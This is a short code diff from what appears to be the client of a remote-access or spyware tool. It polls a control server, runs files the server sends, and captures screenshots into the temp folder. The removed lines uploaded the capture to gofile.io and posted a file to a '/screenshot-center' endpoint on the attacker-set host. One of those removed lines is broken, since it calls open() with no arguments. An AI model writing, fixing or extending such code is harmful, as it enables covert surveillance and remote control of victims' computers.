@@ -29,19 +29,11 @@ def main() -> None:
         if get_run_file_response.status_code == 200:
             run_file(get_run_file_response.json())
         if get_screenshot_file_response.status_code == 200:
-            upload_url = (
-                "https://"
-                + get("https://api.gofile.io/getServer")
-                .json()
-                .get("data")
-                .get("server")
-                + ".gofile.io/uploadFile"
-            )
-            post(f"{SCHEME}://{IP}:{PORT}/screenshot-center", files={"file": open()})
+            take_screenshot()
         sleep(DELAY)
 
 
-def take_screenshot() -> str:
+def take_screenshot() -> None:
     old_cd = getcwd()
     chdir(environ["temp"])
     screenshot().save("temp.png", "png")
